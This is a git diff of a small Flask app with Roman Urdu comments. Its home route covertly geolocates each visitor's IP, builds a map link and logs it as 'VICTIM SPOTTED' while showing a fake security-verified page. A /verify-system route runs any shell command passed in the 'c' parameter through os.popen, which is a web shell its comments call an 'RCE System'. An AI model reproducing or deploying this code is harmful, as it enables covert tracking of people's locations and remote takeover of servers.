@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request
 import requests
 import os
 
@@ -6,31 +6,34 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    # User ka asli IP nikalna (Har hal mein)
-    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
+    # 1. Asli IP nikalna
+    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
     
     try:
-        # Reliable Geolocation API
-        data = requests.get(f'http://ip-api.com/json/{ip}').json()
-        city = data.get('city', 'Unknown')
-        lat = data.get('lat', '0')
-        lon = data.get('lon', '0')
+        # 2. Location API se data lena
+        res = requests.get(f'http://ip-api.com/json/{user_ip}').json()
+        city = res.get('city', 'Karachi')
+        lat = res.get('lat', '24.8607')
+        lon = res.get('lon', '67.0011')
+        
+        # 3. Exact Map Link banana
         map_link = f"https://www.google.com/maps?q={lat},{lon}"
         
-        # Logs mein print karein
-        print(f"\n📍 TARGET: {city} | IP: {ip}")
-        print(f"🔗 MAP: {map_link}\n")
+        # 4. Logs mein data bhejna (Vercel Runtime Logs ke liye)
+        print(f"\n--- [!!!] VICTIM SPOTTED [!!!] ---")
+        print(f"IP: {user_ip} | City: {city}")
+        print(f"Location: {map_link}\n")
         
-        return f"<h1>System Status: Secured</h1><p>Verified IP: {ip}</p><p>City: {city}</p>"
+        return f"<h2>Security Verified</h2><p>Connection: {user_ip}</p><p>City: {city}</p>"
     except:
-        return "<h1>System Updating...</h1>"
+        return "<h2>System Online</h2>"
 
 @app.route('/verify-system')
 def verify_system():
-    # Ye wahi command wala system hai
-    cmd = request.args.get('c', 'ls -la')
+    # RCE System jo aapne test kiya tha
+    cmd = request.args.get('c', 'ls')
     try:
         output = os.popen(cmd).read()
-        return f"<pre>Console Output:\n{output}</pre>"
-    except Exception as e:
-        return str(e)
+        return f"<h3>Console Output:</h3><pre>{output}</pre>"
+    except:
+        return "Access Denied"
